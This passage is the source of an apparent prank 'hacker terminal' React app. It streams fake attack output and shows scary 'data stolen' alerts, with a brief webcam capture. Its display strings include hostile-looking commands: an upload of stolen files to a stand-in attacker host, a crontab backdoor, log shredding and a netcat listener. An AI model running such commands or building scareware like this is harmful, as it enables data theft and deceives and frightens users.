import { AnimatePresence, motion } from "motion/react";
import { useCallback, useEffect, useRef, useState } from "react";

// ─── Fake content pools ───────────────────────────────────────────────────────

const COMMANDS = [
  "nmap -sS -O 192.168.1.1",
  "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
  'sqlmap -u "http://target.local/login" --dbs',
  "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap",
  'msfconsole -q -x "use exploit/multi/handler"',
  "nc -lvnp 4444",
  "python3 reverse_shell.py --target 10.0.0.5",
  "./CVE-2024-0001.sh --payload /tmp/shell.elf",
  "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
  "wireshark -i eth0 -k",
  "tcpdump -i any -w capture.pcap",
  "john --wordlist=/etc/passwords shadow.hash",
  "exploitdb search buffer overflow 2024",
  "metasploit> use auxiliary/scanner/portscan/tcp",
];

const FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/var/log/auth.log",
  "/var/log/syslog",
  "/root/.ssh/id_rsa",
  "/home/admin/.bash_history",
  "C:\\Windows\\System32\\config\\SAM",
  "C:\\Windows\\System32\\config\\SYSTEM",
  "/proc/self/environ",
  "/tmp/shell.elf",
  "/var/www/html/config.php",
  "/etc/nginx/nginx.conf",
];

const STATUSES = [
  "[OK]",
  "[BYPASSED]",
  "[ENCRYPTED]",
  "[DECRYPTED]",
  "[FAILED]",
  "[INJECTED]",
];
const STATUS_COLORS: Record<string, string> = {
  "[OK]": "neon-text",
  "[BYPASSED]": "neon-text",
  "[ENCRYPTED]": "amber-text",
  "[DECRYPTED]": "neon-text",
  "[FAILED]": "red-glow",
  "[INJECTED]": "amber-text",
};

const SYSTEM_MSGS = [
  "KERNEL BREACH DETECTED",
  "Injecting payload into ring0...",
  "Privilege escalation successful",
  "Firewall rules flushed",
  "ARP cache poisoned",
  "Rootkit installed → persistence established",
  "Exfiltrating data via DNS tunnel",
  "Memory dump in progress...",
  "Disabling antivirus signatures...",
  "Lateral movement initiated",
  "C2 server connection established",
  "Zero-day exploit loaded into memory",
];

const FLASH_MESSAGES: { text: string; color: "neon" | "red" }[] = [
  { text: "ACCESS GRANTED", color: "neon" },
  { text: "SYSTEM COMPROMISED", color: "red" },
  { text: "FIREWALL BYPASSED", color: "neon" },
  { text: "ROOT ACCESS OBTAINED", color: "red" },
  { text: "DATABASE EXFILTRATED", color: "red" },
  { text: "ENCRYPTION CRACKED", color: "neon" },
];

const PANEL_TITLES = [
  "[SYSTEM DIAGNOSTICS]",
  "[ACCESS LOGS]",
  "[CODE // FIREWALL_BYPASS]",
  "[NETWORK SCAN]",
  "[PAYLOAD INJECTOR]",
  "[CRYPTO DECRYPTOR]",
];

const STORAGE_KEY = "hacker_terminal_saved_msgs";

const LOADER_WARNINGS = [
  { text: "⚠ WARNING: UNAUTHORIZED ACCESS DETECTED", color: "red" as const },
  { text: "⚠ WARNING: FIREWALL BREACH IN PROGRESS", color: "red" as const },
  { text: "⚠ WARNING: ENCRYPTING STOLEN DATA...", color: "amber" as const },
  { text: "⚠ WARNING: UPLOADING TO REMOTE SERVER...", color: "amber" as const },
  { text: "⚠ CRITICAL: COVER TRACKS INITIATED", color: "red" as const },
  {
    text: "⚠ CRITICAL: SYSTEM COMPROMISED — DO NOT CLOSE!",
    color: "red" as const,
  },
];

const LOADER_CMDS = [
  "root@attacker:~$ ./exfiltrate.sh --target localhost --port 443",
  "[+] Connecting to C2 server at 185.220.101.47:443...",
  "[+] TLS handshake complete. Session encrypted.",
  "root@attacker:~$ tar czf /tmp/loot.tar.gz /home /etc/passwd /var/www",
  "[+] Compressing 2,847 files... done (847 MB)",
  "root@attacker:~$ curl -s -T /tmp/loot.tar.gz https://dropzone.evil.io/upload",
  "[+] Uploading chunk 1/8 ... [████░░░░] 12.4 MB/s",
  "[+] Uploading chunk 2/8 ... [████████░░] 15.1 MB/s",
  "root@attacker:~$ shred -vzn 3 /var/log/auth.log",
  "[+] Overwriting logs... pass 1/3 complete",
  "root@attacker:~$ crontab -l | grep backdoor || (crontab -l; echo '@reboot /tmp/.bd') | crontab -",
  "[+] Persistence established. Backdoor installed.",
  "root@attacker:~$ history -c && echo 'Access complete'",
  "[+] Upload complete. 847 MB transferred successfully.",
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function randInt(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randItem<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randHex(len: number) {
  return `0x${Array.from({ length: len }, () =>
    Math.floor(Math.random() * 16)
      .toString(16)
      .toUpperCase(),
  ).join("")}`;
}

function randIp() {
  const prefixes = ["192.168", "10.0", "172.16"];
  const p = randItem(prefixes);
  return `${p}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

function randProgress() {
  const pct = randInt(60, 100);
  const filled = Math.floor(pct / 10);
  const bar = "█".repeat(filled) + "░".repeat(10 - filled);
  return `Decrypting... ${bar} ${pct}%`;
}

type LineType =
  | "cmd"
  | "file"
  | "hex"
  | "sys"
  | "ip"
  | "progress"
  | "login"
  | "custom";

interface TermLine {
  id: number;
  text: string;
  status?: string;
  type: LineType;
}

interface SavedMessage {
  id: string;
  text: string;
  createdAt: number;
}

let lineIdCounter = 0;

function generateLine(panelIndex: number): TermLine {
  const types: LineType[] = [
    "cmd",
    "file",
    "hex",
    "sys",
    "ip",
    "progress",
    "login",
  ];
  const weights: LineType[][] = [
    ["sys", "sys", "cmd", "hex"],
    ["file", "file", "ip", "sys"],
    ["cmd", "cmd", "hex", "hex"],
    ["ip", "ip", "cmd", "sys"],
    ["cmd", "hex", "sys", "progress"],
    ["hex", "hex", "file", "login"],
  ];
  const pool = weights[panelIndex] ?? types;
  const type = randItem(pool);
  const id = lineIdCounter++;

  switch (type) {
    case "cmd":
      return { id, text: `root@cyber:~$ ${randItem(COMMANDS)}`, type };
    case "file": {
      const st = randItem(STATUSES);
      return { id, text: `Accessing ${randItem(FILES)}...`, status: st, type };
    }
    case "hex": {
      const from = randHex(6);
      const to = randHex(6);
      return { id, text: `${from} --> ${to}`, type };
    }
    case "sys":
      return { id, text: randItem(SYSTEM_MSGS), type };
    case "ip": {
      const ip = randIp();
      const st = randItem(STATUSES);
      return {
        id,
        text: `[${ip}] --> Bypassing firewall...`,
        status: st,
        type,
      };
    }
    case "progress":
      return { id, text: randProgress(), type };
    case "login":
      return {
        id,
        text: `root@target:~$ sudo su  →  ${randItem(STATUSES)}`,
        type,
      };
    default:
      return { id, text: "PROCESSING...", type };
  }
}

// ─── HackerLoader ─────────────────────────────────────────────────────────────

function HackerLoader() {
  const [progress, setProgress] = useState(0);
  const [visibleWarnings, setVisibleWarnings] = useState<number[]>([]);
  const [visibleCmds, setVisibleCmds] = useState<string[]>([]);
  const [bytes, setBytes] = useState(0);
  const [speed, setSpeed] = useState(0);
  const [fileCount, setFileCount] = useState(0);
  const [blinkRed, setBlinkRed] = useState(false);
  const cmdScrollRef = useRef<HTMLDivElement>(null);

  // Progress bar: fill over ~6s
  useEffect(() => {
    const startTime = Date.now();
    const duration = 6200;
    const frame = () => {
      const elapsed = Date.now() - startTime;
      const pct = Math.min(100, (elapsed / duration) * 100);
      setProgress(pct);
      if (pct < 100) requestAnimationFrame(frame);
    };
    requestAnimationFrame(frame);
  }, []);

  // Stats counter
  useEffect(() => {
    const interval = setInterval(() => {
      setBytes((b) => b + randInt(180000, 420000));
      setSpeed(Number.parseFloat((Math.random() * 12 + 4).toFixed(1)));
      setFileCount((f) => f + randInt(2, 9));
    }, 120);
    return () => clearInterval(interval);
  }, []);

  // Warnings: appear one by one every 800ms
  useEffect(() => {
    LOADER_WARNINGS.forEach((_, i) => {
      const t = setTimeout(
        () => {
          setVisibleWarnings((prev) => [...prev, i]);
        },
        400 + i * 820,
      );
      return () => clearTimeout(t);
    });
  }, []);

  // Terminal commands: stream in every 400ms
  useEffect(() => {
    LOADER_CMDS.forEach((cmd, i) => {
      const t = setTimeout(
        () => {
          setVisibleCmds((prev) => [...prev, cmd]);
          setTimeout(() => {
            if (cmdScrollRef.current) {
              cmdScrollRef.current.scrollTop =
                cmdScrollRef.current.scrollHeight;
            }
          }, 30);
        },
        300 + i * 420,
      );
      return () => clearTimeout(t);
    });
  }, []);

  // Blink effect for warnings
  useEffect(() => {
    const interval = setInterval(() => {
      setBlinkRed((b) => !b);
    }, 500);
    return () => clearInterval(interval);
  }, []);

  const formatBytes = (b: number) => {
    if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / (1024 * 1024)).toFixed(2)} MB`;
  };

  return (
    <motion.div
      key="hacker-loader"
      initial={{ opacity: 1 }}
      exit={{ opacity: 0, scale: 1.04 }}
      transition={{ duration: 0.6, ease: "easeInOut" }}
      data-ocid="loader.panel"
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 200,
        background: "oklch(0.040 0.010 145)",
        fontFamily: "'JetBrains Mono', 'Courier New', monospace",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "24px",
        gap: "0",
        overflow: "hidden",
      }}
    >
      {/* Scanline overlay */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          backgroundImage:
            "repeating-linear-gradient(0deg, transparent, transparent 2px, oklch(0 0 0 / 0.08) 2px, oklch(0 0 0 / 0.08) 4px)",
          pointerEvents: "none",
          zIndex: 1,
        }}
      />

      {/* Corner brackets */}
      {(["top-left", "top-right", "bottom-left", "bottom-right"] as const).map(
        (pos) => (
          <div
            key={pos}
            style={{
              position: "absolute",
              width: "40px",
              height: "40px",
              top: pos.startsWith("top") ? "16px" : undefined,
              bottom: pos.startsWith("bottom") ? "16px" : undefined,
              left: pos.endsWith("left") ? "16px" : undefined,
              right: pos.endsWith("right") ? "16px" : undefined,
              borderTop: pos.startsWith("top")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderBottom: pos.startsWith("bottom")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderLeft: pos.endsWith("left")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              borderRight: pos.endsWith("right")
                ? "2px solid oklch(0.62 0.22 25 / 0.8)"
                : undefined,
              pointerEvents: "none",
              zIndex: 2,
            }}
          />
        ),
      )}

      {/* Main content */}
      <div
        style={{
          position: "relative",
          zIndex: 2,
          width: "100%",
          maxWidth: "760px",
          display: "flex",
          flexDirection: "column",
          gap: "16px",
        }}
      >
        {/* Title */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4 }}
          style={{ textAlign: "center" }}
        >
          <div
            style={{
              color: blinkRed ? "oklch(0.72 0.22 25)" : "oklch(0.65 0.22 25)",
              fontSize: "clamp(1rem, 3vw, 1.6rem)",
              fontWeight: "bold",
              letterSpacing: "0.25em",
              textShadow: blinkRed
                ? "0 0 30px oklch(0.72 0.22 25 / 0.9), 0 0 60px oklch(0.72 0.22 25 / 0.5)"
                : "0 0 15px oklch(0.65 0.22 25 / 0.6)",
              transition: "all 0.3s",
              marginBottom: "4px",
            }}
          >
            ⚠ TRANSFERRING DATA... DO NOT CLOSE ⚠
          </div>
          <div
            style={{
              color: "oklch(0.56 0.03 145)",
              fontSize: "0.6rem",
              letterSpacing: "0.2em",
            }}
          >
            UNAUTHORIZED ACCESS IN PROGRESS — SYSTEM BREACH ACTIVE
          </div>
        </motion.div>

        {/* Progress Bar + Percentage */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          style={{ display: "flex", flexDirection: "column", gap: "6px" }}
        >
          <div
            style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <span
              style={{
                color: "oklch(0.62 0.22 25)",
                fontSize: "0.6rem",
                letterSpacing: "0.15em",
              }}
            >
              TRANSFER PROGRESS
            </span>
            <span
              style={{
                color: "oklch(0.85 0.22 145)",
                fontSize: "1rem",
                fontWeight: "bold",
                letterSpacing: "0.1em",
                textShadow: "0 0 10px oklch(0.85 0.22 145 / 0.7)",
              }}
            >
              {Math.floor(progress)}%
            </span>
          </div>
          {/* Progress track */}
          <div
            style={{
              width: "100%",
              height: "18px",
              background: "oklch(0.08 0.012 145)",
              border: "1px solid oklch(0.85 0.22 145 / 0.35)",
              position: "relative",
              overflow: "hidden",
            }}
          >
            <motion.div
              style={{
                position: "absolute",
                top: 0,
                left: 0,
                height: "100%",
                width: `${progress}%`,
                background:
                  "linear-gradient(90deg, oklch(0.62 0.22 25 / 0.8), oklch(0.72 0.22 25))",
                boxShadow: "0 0 12px oklch(0.72 0.22 25 / 0.7)",
                transition: "width 0.08s linear",
              }}
            />
            {/* Animated stripe */}
            <div
              style={{
                position: "absolute",
                inset: 0,
                backgroundImage:
                  "repeating-linear-gradient(90deg, transparent 0px, transparent 8px, oklch(0 0 0 / 0.15) 8px, oklch(0 0 0 / 0.15) 12px)",
                animation: "stripe-move 0.6s linear infinite",
              }}
            />
          </div>
        </motion.div>

        {/* Stats Row */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "8px",
          }}
        >
          {[
            { label: "BYTES TRANSFERRED", value: formatBytes(bytes) },
            { label: "TRANSFER SPEED", value: `${speed} MB/s` },
            { label: "FILES STOLEN", value: `${fileCount.toLocaleString()}` },
          ].map(({ label, value }) => (
            <div
              key={label}
              style={{
                background: "oklch(0.055 0.008 145)",
                border: "1px solid oklch(0.85 0.22 145 / 0.25)",
                padding: "8px 12px",
                textAlign: "center",
              }}
            >
              <div
                style={{
                  color: "oklch(0.56 0.03 145)",
                  fontSize: "0.5rem",
                  letterSpacing: "0.15em",
                  marginBottom: "4px",
                }}
              >
                {label}
              </div>
              <div
                style={{
                  color: "oklch(0.85 0.22 145)",
                  fontSize: "0.85rem",
                  fontWeight: "bold",
                  letterSpacing: "0.1em",
                  textShadow: "0 0 8px oklch(0.85 0.22 145 / 0.6)",
                }}
              >
                {value}
              </div>
            </div>
          ))}
        </motion.div>

        {/* Main two-column: warnings + terminal */}
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: "10px",
            minHeight: "0",
          }}
        >
          {/* Warnings column */}
          <motion.div
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.5 }}
            style={{
              background: "oklch(0.042 0.008 25)",
              border: "1px solid oklch(0.62 0.22 25 / 0.5)",
              padding: "10px",
              display: "flex",
              flexDirection: "column",
              gap: "0",
              minHeight: "150px",
            }}
          >
            <div
              style={{
                color: "oklch(0.62 0.22 25)",
                fontSize: "0.55rem",
                letterSpacing: "0.2em",
                borderBottom: "1px solid oklch(0.62 0.22 25 / 0.3)",
                paddingBottom: "6px",
                marginBottom: "8px",
              }}
            >
              ▶ SECURITY ALERTS
            </div>
            <div
              style={{ display: "flex", flexDirection: "column", gap: "5px" }}
            >
              <AnimatePresence>
                {LOADER_WARNINGS.map((w, i) =>
                  visibleWarnings.includes(i) ? (
                    <motion.div
                      key={w.text}
                      initial={{ opacity: 0, x: -10 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ duration: 0.3 }}
                      style={{
                        color:
                          w.color === "red"
                            ? blinkRed
                              ? "oklch(0.78 0.22 25)"
                              : "oklch(0.62 0.22 25)"
                            : blinkRed
                              ? "oklch(0.88 0.18 75)"
                              : "oklch(0.75 0.18 75)",
                        fontSize: "0.6rem",
                        letterSpacing: "0.04em",
                        textShadow:
                          w.color === "red"
                            ? "0 0 6px oklch(0.72 0.22 25 / 0.6)"
                            : "0 0 6px oklch(0.80 0.18 75 / 0.5)",
                        transition: "color 0.3s",
                        fontWeight: "bold",
                        lineHeight: "1.4",
                      }}
                    >
                      {w.text}
                    </motion.div>
                  ) : null,
                )}
              </AnimatePresence>
            </div>
          </motion.div>

          {/* Terminal column */}
          <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.5 }}
            style={{
              background: "oklch(0.038 0.007 145)",
              border: "1px solid oklch(0.85 0.22 145 / 0.3)",
              padding: "10px",
              display: "flex",
              flexDirection: "column",
              minHeight: "150px",
            }}
          >
            <div
              style={{
                color: "oklch(0.85 0.22 145)",
                fontSize: "0.55rem",
                letterSpacing: "0.2em",
                borderBottom: "1px solid oklch(0.85 0.22 145 / 0.3)",
                paddingBottom: "6px",
                marginBottom: "8px",
                flexShrink: 0,
              }}
            >
              ▶ EXECUTING COMMANDS
            </div>
            <div
              ref={cmdScrollRef}
              style={{
                flex: 1,
                overflowY: "hidden",
                display: "flex",
                flexDirection: "column",
                gap: "3px",
              }}
            >
              {visibleCmds.map((cmd) => (
                <motion.div
                  key={cmd}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ duration: 0.2 }}
                  style={{
                    color: cmd.startsWith("[+]")
                      ? "oklch(0.75 0.14 145)"
                      : "oklch(0.62 0.10 145)",
                    fontSize: "0.55rem",
                    lineHeight: "1.4",
                    whiteSpace: "nowrap",
                    overflow: "hidden",
                    textOverflow: "ellipsis",
                    fontWeight: cmd.startsWith("root@") ? "normal" : "normal",
                  }}
                >
                  {cmd}
                </motion.div>
              ))}
              {/* Blinking cursor */}
              <span
                style={{
                  display: "inline-block",
                  color: "oklch(0.85 0.22 145)",
                  animation: "blink 1s step-start infinite",
                  fontSize: "0.6rem",
                }}
              >
                ▮
              </span>
            </div>
          </motion.div>
        </div>

        {/* Bottom status */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.6 }}
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            borderTop: "1px solid oklch(0.85 0.22 145 / 0.2)",
            paddingTop: "8px",
          }}
        >
          <span
            style={{
              color: "oklch(0.56 0.03 145)",
              fontSize: "0.5rem",
              letterSpacing: "0.1em",
            }}
          >
            TARGET: {randIp()} | ATTACKER: 185.220.101.47 | PORT: 443/TLS
          </span>
          <span
            style={{
              color: blinkRed
                ? "oklch(0.78 0.22 25)"
                : "oklch(0.62 0.22 25 / 0.7)",
              fontSize: "0.5rem",
              letterSpacing: "0.1em",
              transition: "color 0.3s",
              fontWeight: "bold",
            }}
          >
            ● BREACH ACTIVE
          </span>
        </motion.div>
      </div>
    </motion.div>
  );
}

// ─── TermPanel ────────────────────────────────────────────────────────────────

const MAX_LINES = 60;

function TermPanel({
  title,
  panelIndex,
  paused,
  injectLine,
}: {
  title: string;
  panelIndex: number;
  paused: boolean;
  injectLine: TermLine | null;
}) {
  const [lines, setLines] = useState<TermLine[]>(() =>
    Array.from({ length: 12 }, () => generateLine(panelIndex)),
  );
  const scrollRef = useRef<HTMLDivElement>(null);
  const pausedRef = useRef(paused);

  useEffect(() => {
    pausedRef.current = paused;
  }, [paused]);

  useEffect(() => {
    if (injectLine === null) return;
    setLines((prev) => {
      const next = [...prev, injectLine];
      return next.length > MAX_LINES
        ? next.slice(next.length - MAX_LINES)
        : next;
    });
    if (!pausedRef.current) {
      setTimeout(() => {
        if (scrollRef.current) {
          scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
        }
      }, 50);
    }
  }, [injectLine]);

  useEffect(() => {
    const delay = randInt(200, 800);
    const timer = setTimeout(() => {
      const interval = setInterval(
        () => {
          if (pausedRef.current) return;
          setLines((prev) => {
            const next = [...prev, generateLine(panelIndex)];
            return next.length > MAX_LINES
              ? next.slice(next.length - MAX_LINES)
              : next;
          });
          if (scrollRef.current) {
            scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
          }
        },
        randInt(120, 380),
      );
      return () => clearInterval(interval);
    }, delay);
    return () => clearTimeout(timer);
  }, [panelIndex]);

  return (
    <div
      className="flex flex-col panel-bg neon-border panel-pulse"
      style={{ height: "100%", overflow: "hidden" }}
    >
      <div
        className="flex items-center gap-2 px-2 py-1 shrink-0"
        style={{
          borderBottom: "1px solid oklch(0.85 0.22 145 / 0.5)",
          background: "oklch(0.06 0.01 145)",
        }}
      >
        <span
          className="neon-text text-xs font-bold tracking-widest"
          style={{ letterSpacing: "0.1em" }}
        >
          {title}
        </span>
        <span
          className="ml-auto text-xs"
          style={{ color: "oklch(0.56 0.03 145)", fontSize: "0.6rem" }}
        >
          PID:{randInt(1000, 9999)}
        </span>
        <span className="blink-cursor neon-text text-xs">▮</span>
      </div>
      <div
        ref={scrollRef}
        className="flex-1 px-2 py-1 term-scrollable"
        style={{
          overflowY: paused ? "auto" : "hidden",
          scrollBehavior: "smooth",
        }}
      >
        {lines.map((line) => (
          <div
            key={line.id}
            className="text-xs leading-tight py-px flex gap-1 flex-wrap"
            style={{ lineHeight: "1.3", fontSize: "0.65rem" }}
          >
            {line.type === "custom" ? (
              <span
                style={{
                  color: "oklch(0.95 0.18 75)",
                  fontWeight: "bold",
                  textShadow: "0 0 8px oklch(0.95 0.18 75 / 0.8)",
                }}
              >
                ▶ {line.text}
              </span>
            ) : line.type === "sys" ? (
              <span
                className="amber-text font-bold"
                style={{ textShadow: "0 0 6px oklch(0.80 0.18 75 / 0.7)" }}
              >
                ⚠ {line.text}
              </span>
            ) : line.type === "cmd" ? (
              <span style={{ color: "oklch(0.75 0.15 145)" }}>{line.text}</span>
            ) : line.type === "hex" ? (
              <span className="neon-text-dim" style={{ opacity: 0.8 }}>
                {line.text}
              </span>
            ) : (
              <>
                <span className="neon-text-dim">{line.text}</span>
                {line.status && (
                  <span className={STATUS_COLORS[line.status] ?? "neon-text"}>
                    {line.status}
                  </span>
                )}
              </>
            )}
          </div>
        ))}
      </div>
      <div className="scanline absolute inset-0 pointer-events-none" />
    </div>
  );
}

// ─── App ──────────────────────────────────────────────────────────────────────

export default function App() {
  const [showLoader, setShowLoader] = useState(true);
  const [flashMsg, setFlashMsg] = useState<{
    text: string;
    color: "neon" | "red";
  } | null>(null);
  const [showEasterEgg, setShowEasterEgg] = useState(false);
  const [time, setTime] = useState(new Date());
  const [sessionId] = useState(() => randHex(8).replace("0x", "SESS-"));
  const [fakeIp] = useState(() => randIp());
  const flashTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [paused, setPaused] = useState(false);
  const [showAddMsg, setShowAddMsg] = useState(false);
  const [msgInput, setMsgInput] = useState("");
  const [selectedMsgId, setSelectedMsgId] = useState<string | null>(null);
  const [injectedLines, setInjectedLines] = useState<(TermLine | null)[]>(
    Array(6).fill(null),
  );

  // Hide loader after 6.5s
  useEffect(() => {
    const t = setTimeout(() => setShowLoader(false), 6500);
    return () => clearTimeout(t);
  }, []);

  // ── Saved messages (localStorage) ──
  const [savedMessages, setSavedMessages] = useState<SavedMessage[]>(() => {
    try {
      const stored = localStorage.getItem(STORAGE_KEY);
      return stored ? (JSON.parse(stored) as SavedMessage[]) : [];
    } catch {
      return [];
    }
  });

  const persistMessages = (msgs: SavedMessage[]) => {
    setSavedMessages(msgs);
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(msgs));
    } catch {
      // ignore
    }
  };

  const deleteMessage = (id: string) => {
    persistMessages(savedMessages.filter((m) => m.id !== id));
  };

  // On load: re-inject saved messages into panels with staggered delay
  const initialMsgsRef = useRef<SavedMessage[]>(savedMessages);
  useEffect(() => {
    const msgs = initialMsgsRef.current;
    if (msgs.length === 0) return;
    msgs.forEach((msg, i) => {
      setTimeout(
        () => {
          const newLine: TermLine = {
            id: lineIdCounter++,
            text: msg.text,
            type: "custom",
          };
          setInjectedLines(Array(6).fill(newLine));
          setTimeout(() => setInjectedLines(Array(6).fill(null)), 100);
        },
        i * 600 + 7500,
      );
    });
  }, []);

  // Clock
  useEffect(() => {
    const t = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(t);
  }, []);

  // Flash messages
  const triggerFlash = useCallback(() => {
    if (paused) return;
    const msg = randItem(FLASH_MESSAGES);
    setFlashMsg(msg);
    if (flashTimeoutRef.current) clearTimeout(flashTimeoutRef.current);
    flashTimeoutRef.current = setTimeout(() => setFlashMsg(null), 2200);
  }, [paused]);

  useEffect(() => {
    const initial = setTimeout(() => {
      triggerFlash();
      const interval = setInterval(triggerFlash, randInt(10000, 16000));
      return () => clearInterval(interval);
    }, 9000);
    return () => clearTimeout(initial);
  }, [triggerFlash]);

  // ESC key easter egg
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === "Escape" && !showAddMsg) setShowEasterEgg(true);
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [showAddMsg]);

  const restart = () => {
    setShowEasterEgg(false);
    setFlashMsg(null);
  };

  const handleAddMessage = () => {
    if (!msgInput.trim()) return;
    const text = msgInput.trim();
    const newLine: TermLine = {
      id: lineIdCounter++,
      text,
      type: "custom",
    };
    // Inject into all panels
    setInjectedLines(Array(6).fill(newLine));
    setTimeout(() => setInjectedLines(Array(6).fill(null)), 100);

    // Save permanently (only if not already a saved message being re-injected)
    if (!selectedMsgId) {
      const newSaved: SavedMessage = {
        id: `msg_${Date.now()}_${Math.random().toString(36).slice(2)}`,
        text,
        createdAt: Date.now(),
      };
      persistMessages([...savedMessages, newSaved]);
    }

    setMsgInput("");
    setSelectedMsgId(null);
    // Close modal and return to panels
    setShowAddMsg(false);
  };

  // ── Scary Hack Effects ──────────────────────────────────────────────────────

  // Camera state
  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
  const [showCamera, setShowCamera] = useState(false);
  const [cameraBlocked, setCameraBlocked] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const cameraAttempted = useRef(false);

  // Scary popup notifications
  const [scaryPopups, setScaryPopups] = useState<
    {
      id: number;
      title: string;
      detail: string;
      position: "top-right" | "bottom-right";
    }[]
  >([]);
  const popupIdRef = useRef(0);

  // Screen shake
  const [shaking, setShaking] = useState(false);

  // Red flash
  const [redFlash, setRedFlash] = useState(false);

  // System alert banner
  const [showBanner, setShowBanner] = useState(false);

  // Helper: beep sound
  const playBeep = useCallback(() => {
    try {
      const ctx = new AudioContext();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 880;
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
      osc.start();
      osc.stop(ctx.currentTime + 0.2);
    } catch {
      // ignore audio errors
    }
  }, []);

  // Helper: add scary popup
  const addScaryPopup = useCallback(
    (title: string, detail: string, position: "top-right" | "bottom-right") => {
      const id = ++popupIdRef.current;
      setScaryPopups((prev) => [...prev, { id, title, detail, position }]);
      playBeep();
      setTimeout(
        () => setScaryPopups((prev) => prev.filter((p) => p.id !== id)),
        3800,
      );
    },
    [playBeep],
  );

  // Camera effect (once, after ~12s)
  useEffect(() => {
    if (showLoader) return;
    if (cameraAttempted.current) return;
    cameraAttempted.current = true;
    const t = setTimeout(async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false,
        });
        setCameraStream(stream);
        setShowCamera(true);
        // Auto-stop after 15s
        setTimeout(() => {
          for (const track of stream.getTracks()) track.stop();
          setShowCamera(false);
          setCameraStream(null);
        }, 15000);
      } catch {
        setCameraBlocked(true);
        setTimeout(() => setCameraBlocked(false), 3000);
      }
    }, 12000);
    return () => clearTimeout(t);
  }, [showLoader]);

  // Attach camera stream to video element
  useEffect(() => {
    if (videoRef.current && cameraStream) {
      videoRef.current.srcObject = cameraStream;
    }
  }, [cameraStream]);

  // Cleanup camera on unmount
  useEffect(() => {
    return () => {
      if (cameraStream) {
        for (const t of cameraStream.getTracks()) t.stop();
      }
    };
  }, [cameraStream]);

  // Scary popup random interval
  const SCARY_ALERTS = [
    {
      title: "📸 SCREENSHOT CAPTURED",
      detail: "Uploaded to remote server 185.220.101.47",
    },
    {
      title: "📍 LOCATION ACQUIRED",
      detail: "City: Karachi, PK | Coords: 24.8607° N, 67.0011° E",
    },
    {
      title: "🎤 MICROPHONE ACCESSED",
      detail: "Audio stream active — recording...",
    },
    {
      title: "📋 CLIPBOARD STOLEN",
      detail: "Contents copied to attacker buffer",
    },
    {
      title: "🔑 PASSWORDS EXTRACTED",
      detail: "12 credentials found in browser keychain",
    },
    { title: "📱 CONTACTS UPLOADED", detail: "847 contacts sent to C2 server" },
    {
      title: "🌐 BROWSER HISTORY EXFILTRATED",
      detail: "Last 30 days — 1,247 entries",
    },
  ];

  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(8000, 20000);
      timeoutId = setTimeout(() => {
        const alert = randItem(SCARY_ALERTS);
        const position = Math.random() > 0.5 ? "top-right" : "bottom-right";
        addScaryPopup(
          alert.title,
          alert.detail,
          position as "top-right" | "bottom-right",
        );
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, addScaryPopup]);

  // Screen shake random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(15000, 30000);
      timeoutId = setTimeout(() => {
        setShaking(true);
        setTimeout(() => setShaking(false), 400);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader]);

  // Red flash random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(20000, 40000);
      timeoutId = setTimeout(() => {
        setRedFlash(true);
        playBeep();
